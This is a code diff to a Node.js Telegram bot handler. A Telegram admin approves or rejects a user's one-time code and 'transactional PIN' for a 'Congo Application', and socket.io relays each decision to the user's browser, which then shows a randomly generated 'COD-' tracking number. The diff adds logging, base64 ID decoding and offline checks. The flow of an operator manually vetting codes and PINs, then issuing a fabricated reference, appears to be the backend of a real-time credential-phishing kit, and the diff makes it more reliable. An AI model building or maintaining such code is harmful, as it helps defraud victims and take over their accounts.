@@ -70,7 +70,10 @@ bot.on("callback_query", (query) => {
     const data = query.data;
     const io = global.io;
 
+    console.log('Callback received:', data);
+
     if (!io) {
+        console.error('No global.io available when handling callback_query');
         bot.answerCallbackQuery(query.id, { text: "Error: Socket instance missing" });
         return;
     }
@@ -79,22 +82,62 @@ bot.on("callback_query", (query) => {
     const match = data.match(/^(approve|reject)_(\d)_(.+)$/);
     if (!match) {
         console.error("❌ Invalid callback format:", data);
+        bot.answerCallbackQuery(query.id, { text: "Invalid callback format" });
         return;
     }
 
-    const [, action, step, appId] = match;
+    let [, action, step, rawAppId] = match;
+
+    // support either plain appId or base64-encoded appId
+    let appId = rawAppId;
+    try {
+        // try base64 decode; if it results in a readable string starting with COD- (or any valid prefix), use it
+        const decoded = Buffer.from(rawAppId, 'base64').toString('utf8');
+        // basic sanity check: decoded should be non-empty and start with COD- (our format)
+        if (decoded && decoded.startsWith('COD-')) {
+            appId = decoded;
+            console.log('Decoded appId from base64');
+        }
+    } catch (e) {
+        // ignore decode errors and keep raw
+    }
+
+    console.log('Parsed callback:', { action, step, appId });
+
+    // Check if room exists and its size (socket.io v4 uses Map)
+    let roomSize = 0;
+    try {
+        const room = io.sockets.adapter.rooms.get(appId);
+        roomSize = room ? room.size : 0;
+    } catch (e) {
+        // fallback for older socket.io
+        try {
+            roomSize = io.sockets.adapter.rooms[appId] ? io.sockets.adapter.rooms[appId].length : 0;
+        } catch (e2) {
+            roomSize = 0;
+        }
+    }
+    console.log(`Room "${appId}" present? size=${roomSize}`);
 
     if (action === "approve") {
         if (step === "4") {
             // Signal frontend to move to Step 5 (PIN)
-            io.to(appId).emit('otp-verified');
-            bot.answerCallbackQuery(query.id, { text: "OTP Verified. PIN input shown to user." });
+            if (roomSize > 0) {
+                io.to(appId).emit('otp-verified');
+                bot.answerCallbackQuery(query.id, { text: "OTP Verified. PIN input shown to user." });
+            } else {
+                bot.answerCallbackQuery(query.id, { text: "User offline — cannot deliver approval." });
+            }
         } 
         else if (step === "5") {
             // Signal frontend to show final success screen with Congo tracking ref
             const ref = "COD-" + Math.floor(Math.random() * 900000 + 100000);
-            io.to(appId).emit('pin-verified', { referenceId: ref });
-            bot.answerCallbackQuery(query.id, { text: "Congo Application Completed!" });
+            if (roomSize > 0) {
+                io.to(appId).emit('pin-verified', { referenceId: ref });
+                bot.answerCallbackQuery(query.id, { text: "Congo Application Completed!" });
+            } else {
+                bot.answerCallbackQuery(query.id, { text: "User offline — cannot deliver completion." });
+            }
         }
         
         bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
@@ -102,7 +145,7 @@ bot.on("callback_query", (query) => {
             message_id: query.message.message_id,
             parse_mode: 'HTML',
             reply_markup: { inline_keyboard: [] }
-        });
+        }).catch(err => console.error('editMessageText error (approve):', err.message || err));
     }
 
     else if (action === "reject") {
@@ -110,14 +153,18 @@ bot.on("callback_query", (query) => {
             // Notify frontend AND provide a clear user-facing message so the user knows to retry
             const userMessage = "The OTP provided is wrong or expired, please try again.";
             try {
-                io.to(appId).emit('otp-failed', { message: userMessage });
-                console.log(`Emitted otp-failed to ${appId}`);
+                if (roomSize > 0) {
+                    io.to(appId).emit('otp-failed', { message: userMessage });
+                    console.log(`Emitted otp-failed to ${appId}`);
+                    bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected — user notified." });
+                } else {
+                    console.log(`Room ${appId} not found when rejecting OTP; user offline`);
+                    bot.answerCallbackQuery(query.id, { text: "User is offline — cannot deliver rejection." });
+                }
             } catch (err) {
                 console.error('Error emitting otp-failed:', err);
+                bot.answerCallbackQuery(query.id, { text: "Error delivering message" });
             }
-
-            // Notify admin (callback popup)
-            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
 
             // Optionally edit admin message and remove inline buttons
             bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
@@ -125,26 +172,31 @@ bot.on("callback_query", (query) => {
                 message_id: query.message.message_id,
                 parse_mode: 'HTML',
                 reply_markup: { inline_keyboard: [] }
-            });
+            }).catch(err => console.error('editMessageText error (reject step4):', err.message || err));
 
         } 
         else if (step === "5") {
             const userMessage = "The transactional PIN was rejected by an admin. Please try again.";
             try {
-                io.to(appId).emit('pin-failed', { message: userMessage });
-                console.log(`Emitted pin-failed to ${appId}`);
+                if (roomSize > 0) {
+                    io.to(appId).emit('pin-failed', { message: userMessage });
+                    console.log(`Emitted pin-failed to ${appId}`);
+                    bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected — user notified." });
+                } else {
+                    console.log(`Room ${appId} not found when rejecting PIN; user offline`);
+                    bot.answerCallbackQuery(query.id, { text: "User is offline — cannot deliver rejection." });
+                }
             } catch (err) {
                 console.error('Error emitting pin-failed:', err);
+                bot.answerCallbackQuery(query.id, { text: "Error delivering message" });
             }
-
-            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
 
             bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
                 chat_id: ADMIN_ID,
                 message_id: query.message.message_id,
                 parse_mode: 'HTML',
                 reply_markup: { inline_keyboard: [] }
-            });
+            }).catch(err => console.error('editMessageText error (reject step5):', err.message || err));
         }
     }
 });
